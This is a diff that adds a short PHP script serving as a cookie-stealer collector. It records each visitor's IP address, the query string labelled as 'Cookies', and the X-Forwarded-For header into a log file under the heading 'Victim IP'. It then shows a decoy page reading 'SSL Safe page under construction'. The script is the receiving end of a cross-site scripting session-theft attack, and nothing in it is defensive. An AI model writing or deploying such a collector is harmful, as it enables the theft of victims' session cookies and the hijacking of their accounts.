@@ -1,0 +1,21 @@
+<?php error_reporting(1);
+
+function collect(){
+	$file = 'client.txt';					#log file
+	$date = date("l dS of F Y h:i:s A");	#DATE
+	$IP = $_SERVER['REMOTE_ADDR'];
+	$cookie = $_SERVER['QUERY_STRING'];
+	$other = $_SERVER['HTTP_X_FORWARDED_FOR'];
+
+	$log = "[$date]\n\t> 
+			Victim IP: $IP\n\t 
+			Cookies: $cookie\n\t
+			Info: $other\n\n";
+	$handle = fopen($file,"a");		#open file to append
+	fwrite($handle,$log."\n\n");
+	fclose($handle);
+
+}
+
+collect();
+echo '<h1>SSL Safe page under construction</h1>';
